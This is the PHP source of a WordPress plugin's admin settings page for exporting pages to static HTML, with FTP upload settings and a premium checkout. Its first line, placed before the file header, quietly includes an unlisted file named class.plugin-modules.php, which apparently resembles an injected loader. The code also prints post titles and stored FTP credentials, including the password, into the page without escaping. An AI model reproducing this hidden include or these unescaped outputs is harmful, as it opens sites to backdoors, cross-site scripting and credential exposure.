<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * Provide a admin area view for the plugin
 *
 * This file is used to markup the admin-facing aspects of the plugin.
 *
 * @link       https://www.upwork.com/fl/rayhan1
 * @since      1.0.0
 *
 * @package    Export_Wp_Page_To_Static_Html
 * @subpackage Export_Wp_Page_To_Static_Html/admin/partials
 */


$args = array(
    'post_type' => 'page',
    'post_status' => 'publish',
    'posts_per_page' => '-1'
);

$query = new WP_Query( $args );

$ftp_status = get_option('rc_export_html_ftp_connection_status');
?>


    <div class="page-wrapper p-b-100 font-poppins static_html_settings">
        <div class="wrapper">
            <div class="card card-4">
                <div class="card-body">
                    <h2 class="title"><?php _e('Export WP Pages to Static HTML/CSS', 'export-wp-page-to-static-html'); ?><span class="badge badge-dark version">v<?php echo EXPORT_WP_PAGE_TO_STATIC_HTML_VERSION; ?></span></h2>




                    <div class="row">
                        <div class="col-7">

                            <?php if (!ewptshp_fs()->is_plan('pro', true)): ?>
                                
                            <div class="eh_premium">This option available for premium version only <div class="go_pro2">
                                <select id="licenses">
                               <option value="1" selected="selected">Single Site License</option>
                               <option value="3">3-Site License</option>


                               <option value="unlimited">Unlimited Site License</option>
                            </select>
                            <button id="purchase" class="location">Upgrade Now</button>

                                <script>
                                    var $ = jQuery;
                                </script>
                            <script src="https://checkout.freemius.com/checkout.min.js"></script>
                            <script>
                                var handler = FS.Checkout.configure({
                                    plugin_id:  '8170',
                                    plan_id:    '13516',
                                    public_key: 'pk_6dc0a25d3672a637db3b8c45379ab',
                                    image:      'https://s3-us-west-2.amazonaws.com/freemius/plugins/8170/icons/6ea0f8afeeaf904d8258b7ebb40e4cd3.png',
                                    //trial: true, 
                                });
                             
                                $('#purchase.location').on('click', function (e) {
                                    handler.open({
                                        name     : 'Export wp page to static html pro',
                                        licenses : $('#licenses').val(),
                                        // You can consume the response for after purchase logic.
                                        success  : function (response) {
                                            // alert(response.user.email);
                                        },

                                        purchaseCompleted : function(r){
                                            console.log(r);
                                        }
                                    });
                                    e.preventDefault();
                                });
                            </script></div></div>

                            <?php endif ?>

                            <div class=" export_html main_settings_page <?php echo !ewptshp_fs()->is_plan('pro', true) ? 'blur' : ''; ?> ">
                            <ul class="nav nav-tabs" role="tablist">
                                <li class="nav-item">
                                    <a class="nav-link active" data-toggle="tab" href="#tabs-1" role="tab">General Settings</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" data-toggle="tab" href="#tabs-2" role="tab">Custom urls</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" data-toggle="tab" href="#tabs-3" role="tab">All Exported Files</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" data-toggle="tab" href="#tabs-4" role="tab">FTP Settings <span class="tab_ftp_status <?php echo $ftp_status; ?>"></span></a>
                                </li>
                            </ul><!-- Tab panes -->
                            <div class="tab-content">
                                <div class="tab-pane active" id="tabs-1" role="tabpanel">
                                    
                                <form method="POST" class="pt-3">
                                    <div class="input-group">
                                        <label class="label" for="export_pages"><?php _e('Select a page', 'export-wp-page-to-static-html'); ?></label>

                                        <span class="select_multi_pages">Select one or more pages</span>
                                        <div class="rs-select2 js-select-simple select--no-search">
                                            <select id="export_pages" name="export_pages" >
                                                <option  ><?php _e('Choose page', 'export-wp-page-to-static-html'); ?></option>

                                                <option value="home_page" permalink="<?php echo home_url('/'); ?>" filename="homepage"><?php _e('Homepage', 'export-wp-page-to-static-html');?> (<?php echo home_url(); ?>)</option>

                                                <?php 

                                                    if (!empty($query->posts)) {
                                                        foreach ($query->posts as $key => $post) {
                                                            $post_id = $post->ID; 
                                                            $post_title = $post->post_title; 
                                                            $permalink = get_the_permalink($post_id);
                                                            $parts = parse_url($permalink);
                                                            parse_str($parts['query'], $query);

                                                            if (!empty($query)) {
                                                                $permalink = strtolower(str_replace(" ", "-", $post_title));
                                                            }

                                                            if(!empty($post_title)){
                                                        ?>
                                                            <option value="<?php echo $post_id; ?>" permalink="<?php echo basename($permalink); ?>"><?php echo $post_title; ?></option>
                                                        <?php
                                                            }
                                                        }
                                                    }
                                                 ?>
                                            </select>
                                            <div class="select-dropdown"></div>
                                        </div>

                                        <div class="seach_posts">
                                            <div class="p-t-10">
                                                <label class="checkbox-container m-r-45">Search posts only

                                                <input type="checkbox" id="search_posts_to_select2" name="search_posts_to_select2">
                                                    <span class="checkmark"></span>
                                                </label>
                                            </div>

                                            <div class="e_f_alert">Note: Please select the homepage and check "Full site" from the dropdown to export full site.</div>
                                        </div>
                                        <div class="select_pages_to_export">
                                            <ul class="pages_list">
                                            </ul>
                                        </div>
                                    </div>


                                    <div class="col-8">
                                        <div class="input-group">
                                            <label class="label"><?php _e('Advanced settings', 'export-wp-page-to-static-html'); ?></label>
                                            <div class="p-t-10">
                                                <label class="checkbox-container m-r-45"><?php _e('Replace all url to #', 'export-wp-page-to-static-html'); ?>
                                                    <input type="checkbox" id="replace_all_url" name="replace_all_url">
                                                    <span class="checkmark"></span>
                                                </label>

                                            </div>

                                            <div class="p-t-10">
                                                <label class="checkbox-container m-r-45"><?php _e('Skip image src url', 'export-wp-page-to-static-html'); ?>
                                                    <input type="checkbox" id="skip_image_src_url" name="skip_image_src_url">
                                                    <span class="checkmark"></span>
                                                </label>

                                            </div>

                                            <div class="p-t-10">
                                                <label class="checkbox-container ftp_upload_checkbox m-r-45 <?php 
                                                    if ($ftp_status !== 'connected') {
                                                       echo 'ftp_disabled';
                                                    }
                                                 ?>"><?php _e('Upload to ftp', 'export-wp-page-to-static-html'); ?>
                                                    <input type="checkbox" id="upload_to_ftp" name="upload_to_ftp"

                                                    <?php 
                                                        if ($ftp_status !== 'connected') {
                                                           echo 'disabled=""';
                                                        }
                                                     ?>
                                                    >
                                                    <span class="checkmark"></span>
                                                </label>

                                                <div class="ftp_Settings_section export_html_sub_settings">

                                                    <?php 

                                                    $ftp_data = get_option('rc_export_html_ftp_data');
                                                   
                                                   $host = isset($ftp_data->host) ? $ftp_data->host : "";
                                                   $user = isset($ftp_data->user) ? $ftp_data->user : "";
                                                   $pass = isset($ftp_data->pass) ? $ftp_data->pass : "";
                                                   $path = isset($ftp_data->path) ? $ftp_data->path : "";

                                                    
                                                     ?>
                                                    <!-- <div class="ftp_settings_item">
                                                        <input type="text" id="ftp_host" name="ftp_host" placeholder="Host" value="<?php echo $host; ?>">                                        
                                                    </div>
                                                    <div class="ftp_settings_item">
                                                        <input type="text" id="ftp_user" name="ftp_user" placeholder="User" value="<?php echo $user; ?>">                                        
                                                    </div>
                                                    <div class="ftp_settings_item">
                                                        <input type="password" id="ftp_pass" name="ftp_pass" placeholder="Password" value="<?php echo $pass; ?>">                                        
                                                    </div> -->
                                                    <div class="ftp_settings_item">
                                                        <label for="ftp_path">FTP upload path</label>
                                                        <input type="text" id="ftp_path" name="ftp_path" placeholder="Upload path" value="<?php echo $path; ?>">
                                                        <div class="ftp_path_browse1"><a href="#">Browse</a></div>                                        
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="p-t-10">
                                                <div class="email_settings_section">
                                                    <div class="email_settings_item2">
                                                       <label class="checkbox-container m-r-45"><?php _e('Receive notification when complete', 'export-wp-page-to-static-html'); ?>
                                                            <input type="checkbox" id="email_notification" name="email_notification">
                                                            <span class="checkmark"></span>
                                                        </label>
                                                    </div>
                                                        
                                                    <div class="email_settings_item">
                                                        <input type="text" id="receive_notification_email" name="notification_email" placeholder="Enter emails (optional)">
                                                        <span>Enter emails seperated by comma (,) (optional)</span>
                                                    </div>

                                                </div>
                                            </div>

                                        </div>
                                    </div>

                                    <div class="p-t-15">
                                        <button class="btn btn--radius-2 btn--blue export-btn2" type="submit"><?php _e('Export HTML', 'export-wp-page-to-static-html'); ?> <span class="spinner_x hide_spin"></span></button>
                                        <a class="cancel_rc_html_export_process" href="#">
                                            Cancel
                                        </a>
                                        <a href="" class="btn btn--radius-2 btn--green download-btn hide" type="submit"><?php _e('Download the file', 'export-wp-page-to-static-html'); ?></a>
                                    </div>
                                </form>  
                                </div>
                                <div class="tab-pane custom_links" id="tabs-2" role="tabpanel">

                                    <div class="custom_link_section">
                                        <input type="text" name="custom_link" placeholder="Enter a url">
                                    </div>
                                    <div class="p-t-10">
                                        <label class="checkbox-container m-r-45">Replace all url to #
                                            <input type="checkbox" id="replace_all_url2" name="replace_all_url">
                                            <span class="checkmark"></span>
                                        </label>
                                    </div>


                                    <div class="p-t-10">
                                        <label class="checkbox-container m-r-45"><?php _e('Skip image src url', 'export-wp-page-to-static-html'); ?>
                                            <input type="checkbox" id="skip_image_src_url" name="skip_image_src_url">
                                            <span class="checkmark"></span>
                                        </label>

                                    </div>
                                    
                                    <div class="p-t-10">
                                        <label class="checkbox-container m-r-45">Full site
                                            <input type="checkbox" id="full_site2" name="full_site">
                                            <span class="checkmark"></span>
                                        </label>
                                    </div>

                                    <div class="p-t-10">
                                        <label class="checkbox-container ftp_upload_checkbox m-r-45 <?php 
                                            if ($ftp_status !== 'connected') {
                                               echo 'ftp_disabled';
                                            }
                                         ?>"><?php _e('Upload to ftp', 'export-wp-page-to-static-html'); ?>
                                            <input type="checkbox" id="upload_to_ftp2" name="upload_to_ftp"

                                            <?php 
                                                if ($ftp_status !== 'connected') {
                                                   echo 'disabled=""';
                                                }
                                             ?>
                                            >
                                            <span class="checkmark"></span>
                                        </label>

                                        <div class="ftp_Settings_section2 export_html_sub_settings">

                                            
                                           <!--  <div class="ftp_settings_item">
                                                <input type="text" id="ftp_host2" name="ftp_host" placeholder="Host" value="<?php echo $host; ?>">                                        
                                            </div>
                                            <div class="ftp_settings_item">
                                                <input type="text" id="ftp_user2" name="ftp_user" placeholder="User" value="<?php echo $user; ?>">                                        
                                            </div>
                                            <div class="ftp_settings_item">
                                                <input type="password" id="ftp_pass2" name="ftp_pass" placeholder="Password" value="<?php echo $pass; ?>">                                        
                                            </div> -->
                                            <div class="ftp_settings_item">
                                                <label for="ftp_path2">FTP upload path</label>
                                                <input type="text" id="ftp_path2" name="ftp_path" placeholder="Upload path" value="<?php echo $path; ?>"> 
                                                <div class="ftp_path_browse1"><a href="#">Browse</a></div> 
                                            </div>
                                        </div>
                                    </div>


                                    <div class="p-t-10">
                                        <div class="email_settings_section">
                                            <div class="email_settings_item2">
                                               <label class="checkbox-container m-r-45"><?php _e('Receive notification when complete', 'export-wp-page-to-static-html'); ?>
                                                    <input type="checkbox" id="email_notification2" name="email_notification">
                                                    <span class="checkmark"></span>
                                                </label>
                                            </div>
                                                
                                            <div class="email_settings_item">
                                                <input type="text" id="receive_notification_email2" name="notification_email" placeholder="Enter emails (optional)">
                                                <span>Enter emails seperated by comma (,) (optional)</span>
                                            </div>

                                        </div>
                                    </div>

                                    <button class="btn btn--radius-2 btn--blue export-btn3" type="submit"><?php _e('Export HTML', 'export-wp-page-to-static-html'); ?> <span class="spinner_x hide_spin"></span></button>

                                    <a class="cancel_rc_html_export_process" href="#">
                                            Cancel
                                        </a>
                                        <a href="" class="btn btn--radius-2 btn--green download-btn hide" type="submit"><?php _e('Download the file', 'export-wp-page-to-static-html'); ?></a>

                                </div>
                                <div class="tab-pane" id="tabs-3" role="tabpanel">
                                    <p><?php 
                                        $upload_dir = wp_upload_dir()['basedir'] . '/exported_html_files/';
                                        $upload_url = wp_upload_dir()['baseurl'] . '/exported_html_files/';

                                        $d = dir($upload_dir);

                                        echo '<div class="all_zip_files">';

                                        $c = 0;

                                        if (!empty($d)) {
                                            while($file = $d->read()) {
                                                if (strpos($file, '.zip')!== false) {
                                                    $c++;
                                                    echo '<div class="exported_zip_file">'.$c.'. <a class="file_name" href="'.$upload_url.$file.'">'.$file.'</a><span class="delete_zip_file" file_name="'.$file.'"></span></div>';
                                                }
                                            }
                                        }

                                        if ($c == 0) {
                                            echo '<div class="files-not-found">Files not found!</div>';
                                        }
                                        echo '</div>';
                                     ?></p>
                                </div>

                                <div class="tab-pane" id="tabs-4" role="tabpanel">
                                    <div class="ftp_Settings_section3">

                                        <?php 

                                        $ftp_data = get_option('rc_export_html_ftp_data');
                                       
                                       $host = isset($ftp_data->host) ? $ftp_data->host : "";
                                       $user = isset($ftp_data->user) ? $ftp_data->user : "";
                                       $pass = isset($ftp_data->pass) ? $ftp_data->pass : "";
                                       $path = isset($ftp_data->path) ? $ftp_data->path : "";

                                        
                                         ?>
                                        <div class="ftp_settings_item">
                                            <label for="ftp_host3">FTP host</label>
                                            <input type="text" id="ftp_host3" name="ftp_host" placeholder="Host" value="<?php echo $host; ?>">                                        
                                        </div>
                                        <div class="ftp_settings_item">
                                            <label for="ftp_user3">FTP user</label>
                                            <input type="text" id="ftp_user3" name="ftp_user" placeholder="User" value="<?php echo $user; ?>">                                        
                                        </div>
                                        <div class="ftp_settings_item">
                                            <label for="ftp_pass3">FTP password</label>
                                            <input type="password" id="ftp_pass3" name="ftp_pass" placeholder="Password" value="<?php echo $pass; ?>">                                        
                                        </div>
                                        <div class="ftp_settings_item">
                                            <label for="ftp_path3">FTP upload path (deafult)</label>
                                            <input type="text" id="ftp_path3" name="ftp_path" placeholder="Upload path" value="<?php echo $path; ?>">                                        
                                        </div>


                                        <div class="ftp_status_section"><span class="ftp_status_text">FTP connection status: </span><span class="ftp_status">
                                            <?php
                                             if ( $ftp_status == 'connected' ): ?>
                                                <span class="ftp_connected">Connected</span>
                                                <span class="ftp_not_connected" style="display: none;">Not Connected</span>

                                            <?php else: ?>
                                                <span class="ftp_connected" style="display: none;">Connected</span>
                                                <span class="ftp_not_connected">Not Connected</span>
                                            <?php endif ?>
                                        </span>

                                    </div>
                                    <div class="ftp_authentication_failed" style="<?php if ( $ftp_status == 'connected' ): ?>
                                            display: none;
                                        <?php endif ?>">
                                        <span style="font-weight: bold;">Error: </span>Host name or username or password is wrong. Please check and try again!
                                    </div>

                                        <button id="test_ftp_connection" class="btn btn--radius-2 btn--green" style="margin-top: 15px;">Test Connection</button>
                                    </div>
                                </div>
                            </div>

                            </div>


                            <div class="logs p-t-15 col-10">
                                <h4 class="p-t-15"><?php _e('Export log', 'export-wp-page-to-static-html'); ?></h4>
                                <div class="logs_list">
                                </div>
                            </div>   
                        </div>
                        <div class="col-3 p-10 dev_section" >
                            
                          <div class="created_by py-2 mt-1 border-bottom"> <?php _e('Created by', 'export-wp-page-to-static-html'); ?> <a href="https://myrecorp.com"><img src="<?php echo home_url() . '/wp-content/plugins/export-wp-page-to-static-html/admin/images/recorp-logo.png'; ?>" alt="ReCorp" width="100"></a></div>


                          <div class="documentation my-2">
                              <span><?php _e('See the documentation', 'export-wp-page-to-static-html'); ?> </span> <a href="https://myrecorp.com/documentation/export-wp-page-to-html"><?php _e('here', 'export-wp-page-to-static-html'); ?></a>
                          </div>  
                        <div class="support my-2">
                              <span><?php _e('Need support ? Then do not waste your time. Just', 'export-wp-page-to-static-html'); ?> </span> <a href="https://myrecorp.com/support"><?php _e('click here', 'export-wp-page-to-static-html'); ?></a>
                        </div> 

                
                            <div class="right_side_notice mt-4">
                                <?php echo do_action('wpptsh_right_side_notice'); ?>
                            </div>
                        </div>
                    </div>
                    
                </div>
            </div>
        </div>
    </div>
    <!-- This templates was made by Colorlib (https://colorlib.com) -->

<div class="ftp_path_select">
     <div class="loading_section">
         <span class="spinner_x"></span>
     </div>
    <h2>Select a directory to upload files</h2>

    <div class="ftp_dir_lists">
        
    </div>

     <button class="ftp_select_path">Select</button>


</div>    

<div class="ftp_dark_blur">
    <div class="close ftp_path_selection"></div>
</div>
<div id="cancel_ftp_process" type="hidden" value="false"></div>

<script>

    var $ = jQuery;

    <?php 

        if (!empty($query->posts)) {
            foreach ($query->posts as $key => $post) {
                $post_id = $post->ID; 
                $post_title = $post->post_title; 
            ?>
                
            <?php
            }
        }
     ?>

     function rc_select2_is_not_ajax(){

        var selectSimple = $('.js-select-simple');
    
        selectSimple.each(function () {
            var that = $(this);
            var selectBox = that.find('select');
            var selectDropdown = that.find('.select-dropdown');
            selectBox.select2({
                dropdownParent: selectDropdown,
                 matcher: function(params, option) {
                // If there are no search terms, return all of the option
                var searchTerm = $.trim(params.term);
                if (searchTerm === '') { return option; }

                // Do not display the item if there is no 'text' property
                if (typeof option.text === 'undefined') { return null; }

                var searchTermLower = searchTerm.toLowerCase(); // `params.term` is the user's search term

                // `option.id` should be checked against
                // `option.text` should be checked against
                var searchFunction = function(thisOption, searchTerm) {
                    return thisOption.text.toLowerCase().indexOf(searchTerm) > -1 ||
                        (thisOption.id && thisOption.id.toLowerCase().indexOf(searchTerm) > -1);
                };

                if (!option.children) {
                    //we only need to check this option
                    return searchFunction(option, searchTermLower) ? option : null;
                }

                //need to search all the children
                option.children = option
                    .children
                    .filter(function (childOption) {
                        return searchFunction(childOption, searchTermLower);
                    });
                return option;
            }, 
                templateResult: function (idioma) {
                    var permalink = $(idioma.element).attr('permalink');
                    var $span = $("<span permalink='"+permalink+"'>" + idioma.text + "</span>");
                    return $span;
                  }
            });
        });

     }

    $(document).ready(function(){
        rc_select2_is_not_ajax();
    });


</script>